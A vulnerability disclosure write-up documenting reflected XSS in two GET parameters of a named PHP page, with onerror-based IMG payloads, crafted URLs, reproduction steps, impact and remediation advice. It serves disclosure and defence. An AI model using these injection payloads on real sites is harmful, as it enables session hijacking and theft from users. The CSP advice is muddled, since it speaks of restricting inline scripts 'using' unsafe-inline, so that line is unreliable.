# Reflected Cross-Site Scripting (XSS) - Script Tag Filter Evasion

## Summary

I identified a Reflected Cross-Site Scripting (XSS) vulnerability in the `fname` and `lname` parameters of the application.

The application accepts user-controlled input through the `fname` and `lname` GET parameters and reflects it back to the page without proper sanitization or output encoding. By injecting malicious HTML/JavaScript payloads using event handlers, arbitrary code execution is achieved even when `<script>` tags may be filtered or blocked.

An attacker can craft a malicious URL and trick a victim into clicking it. Once the victim visits the page, the injected JavaScript executes in the context of the vulnerable application, triggering `confirm(1)` and `confirm(2)` popups.

## Vulnerability Type

**Cross-Site Scripting (XSS) - Reflected**

## Vulnerable Parameters

```text
fname
lname
```

## Vulnerable URL

```text
https://kzlabs.in/2.php?fname='>anil<IMG SrC=x ONeRRoR=confirm(1)>&lname='>anil<IMG SrC=x ONeRRoR=confirm(2)>
```

## Steps to Reproduce

1. Open the vulnerable page.

2. Replace the values of the `fname` and `lname` parameters with the following payloads:

   ```text
   fname='>anil<IMG SrC=x ONeRRoR=confirm(1)>
   lname='>anil<IMG SrC=x ONeRRoR=confirm(2)>
   ```

3. Visit the crafted URL:

   ```text
   https://kzlabs.in/2.php?fname=%27%3Eanil%3CIMG+SrC%3Dx+ONeRRoR%3Dconfirm%281%29%3E&lname=%27%3Eanil%3CIMG+SrC%3Dx+ONeRRoR%3Dconfirm%282%29%3E
   ```

4. Observe that the browser executes the injected payload and displays `confirm(1)` and `confirm(2)` popups.

## Payloads Used

```text
fname: '>anil<IMG SrC=x ONeRRoR=confirm(1)>
lname: '>anil<IMG SrC=x ONeRRoR=confirm(2)>
```

URL-encoded versions:
```text
fname: %27%3Eanil%3CIMG+SrC%3Dx+ONeRRoR%3Dconfirm%281%29%3E
lname: %27%3Eanil%3CIMG+SrC%3Dx+ONeRRoR%3Dconfirm%282%29%3E
```

## Proof of Concept

The application accepts the values of the `fname` and `lname` parameters and reflects them directly into the page HTML without proper sanitization. This vulnerability bypasses potential script tag filters by using event handlers instead of `<script>` tags.

The payload works by:
1. Breaking out of the existing HTML context using `'>`
2. Injecting an `<IMG>` tag with the `ONeRRoR` event handler
3. The `ONeRRoR` event triggers when the image fails to load (due to `SrC=x`, where `x` is an invalid source)
4. This executes the JavaScript `confirm(1)` and `confirm(2)`

```html
<!-- Injected payload rendered in the page: -->
'><img src="x" onerror="confirm(1)">
'><img src="x" onerror="confirm(2)">
```

This confirms that arbitrary JavaScript execution is possible through both parameters, successfully evading any `<script>` tag filtering mechanisms.

<img width="1917" height="987" alt="Screenshot 2026-08-14 174042" src="https://github.com/user-attachments/assets/5ad89674-be3e-4ce2-ab94-ae865ae7b74a" />


<img width="1882" height="854" alt="Screenshot 2026-08-14 174053" src="https://github.com/user-attachments/assets/e20c5f6d-6d95-405f-ab81-e5a4fd9f24f8" />


## Impact

An attacker can craft a malicious link that, when opened by a victim, executes arbitrary JavaScript in the context of the vulnerable website. This could allow an attacker to:

- Steal session cookies and hijack user accounts
- Perform actions on behalf of the authenticated user
- Deface the webpage or manipulate its content
- Redirect users to malicious websites
- Capture keystrokes or sensitive information entered by the user
- Bypass weak script tag filtering mechanisms

## Recommendation

To mitigate this vulnerability:

- **Output Encoding**: Use `htmlspecialchars()` (or an equivalent output-encoding function) before rendering user-controlled data in HTML to convert special characters to their HTML entities.
  ```php
  echo htmlspecialchars($_GET['fname'], ENT_QUOTES, 'UTF-8');
  ```

- **Input Validation**: Validate and sanitize all user inputs. Consider using a whitelist approach to allow only safe characters.

- **Content Security Policy (CSP)**: Implement a strict CSP that restricts inline scripts and event handlers using `unsafe-inline` and `unsafe-eval` directives.

- **Context-Aware Escaping**: Use context-aware escaping based on where the data is placed (HTML body, attributes, JavaScript, etc.).

- **Web Application Firewall (WAF)**: Deploy a WAF, such as Cloudflare WAF, to help detect and block malicious XSS payloads.

- **Security Headers**: Implement security headers like `X-XSS-Protection` and `X-Content-Type-Options` for additional protection.

- **HTML Sanitization**: Use a robust HTML sanitization library (like DOMPurify) to strip dangerous tags and attributes while preserving safe content.

---
